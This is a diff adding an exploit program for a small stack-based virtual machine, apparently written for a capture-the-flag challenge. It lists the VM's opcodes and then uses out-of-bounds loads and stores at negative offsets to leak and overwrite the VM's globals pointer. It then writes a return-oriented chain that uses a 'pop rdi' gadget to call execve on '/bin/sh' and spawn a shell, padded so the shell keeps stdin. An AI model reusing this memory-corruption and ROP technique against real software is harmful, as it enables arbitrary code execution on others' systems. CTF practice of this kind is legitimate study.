@@ -1,0 +1,124 @@
+#    { "noop",    0,     0 },
+#    { "iadd",    1,     0 },
+#    { "isub",    2,     0 },
+#    { "imul",    3,     0 },
+#    { "ilt",     4,     0 },
+#    { "ieq",     5,     0 },
+#    { "br",      6,     1 },
+#    { "brt",     7,     1 },
+#    { "brf",     8,     1 },
+#    { "iconst",  9,     1 },
+#    { "load",    10,    1 },
+#    { "gload",   11,    1 },
+#    { "store",   12,    1 },
+#    { "gstore",  13,    1 },
+#    { "print",   14,    0 },
+#    { "pop",     15,    0 },
+#    { "call",    16,    3 },
+#    { "ret",     17,    0 },
+#    { "halt",    18,    0 }
+
+# storing address of vm->globals 
+# before overwriting it
+load -993		# first 4 byte of address
+load -992		# next four byte of address
+
+load -993		# first 4 byte of address
+load -992		# next four byte of address
+
+load -997		# first 4 bytes of vm->code address
+load -996		# next four bytes
+
+
+store -992		# LIFO 
+store -993		# overwriting vm->globals with
+				# with vm->code
+
+# pop rdi
+# ret
+# call execve
+
+gload 134
+iconst 782909	 # call to execve
+iadd
+gload 135
+
+gload 134
+iconst 1639671		# storing address of "/bin/sh" on stack
+iadd
+gload 135
+
+gload 134			# calling gadget pop rdi at location 0x0000000000026b72
+iconst -1345
+iadd
+gstore 134
+
+
+gstore 137		# store address of "/bin/sh"
+gstore 136		# for $rdi to take as input
+
+gstore 139		# store address of execve
+gstore 138
+
+store -992		# LIFO
+store -993		# restore address of vm->globals
+
+
+# padding for read function In order to open
+# our /bin/sh stdin
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
+iconst 0
+pop
